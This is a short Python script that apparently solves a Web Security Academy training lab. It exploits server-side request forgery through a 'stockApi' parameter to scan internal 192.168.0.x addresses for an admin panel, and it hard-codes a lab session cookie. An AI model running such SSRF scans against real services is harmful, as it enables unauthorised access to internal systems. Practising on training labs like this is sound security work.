import requests

url = 'https://0af0008e0409fc3ebe29344700800056.web-security-academy.net/product/stock'

for i in range(99, 256):
    response = requests.post(url, data={'stockApi': f'http://192.168.0.{i}:8080/admin'}, cookies={'session': "xvsQFWvpgvW6yNLNcdf1sdab6Nhkya7B"})
    print(f'Trying 192.168.0.{i}', response.status_code)
    if response.status_code == 200:
        print(f'Found it! 192.168.0.{i}')
        break

